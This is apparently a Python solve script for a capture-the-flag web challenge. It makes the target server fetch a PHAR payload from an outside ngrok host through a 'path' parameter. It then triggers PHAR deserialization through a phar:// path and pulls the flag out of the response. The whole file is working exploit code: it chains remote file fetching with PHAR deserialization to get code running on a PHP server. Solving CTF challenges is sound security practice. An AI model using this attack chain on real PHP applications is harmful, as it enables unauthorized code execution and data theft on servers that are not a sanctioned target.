import requests
import subprocess
import re
import os

url = 'https://braised-apple-under-cured-butter-evdz.gpn24.ctf.kitctf.de/'
s = requests.Session()

subprocess.run(['php', '-d', 'phar.readonly=0', 'payload.php'], capture_output=True)
print("> Generated payload")

res = s.get(url, params={
    'path': 'https://interventricular-melina-unspecializing.ngrok-free.dev',
})

print("> Uploaded payload")

os.remove('payload.phar')

res = s.get(url, params={
    'path': 'phar:///tmp/remote_file.jpg/a'
})

flag = re.findall(r'(GPNCTF{.+?})', res.text)[0].strip()
print("Flag:", flag)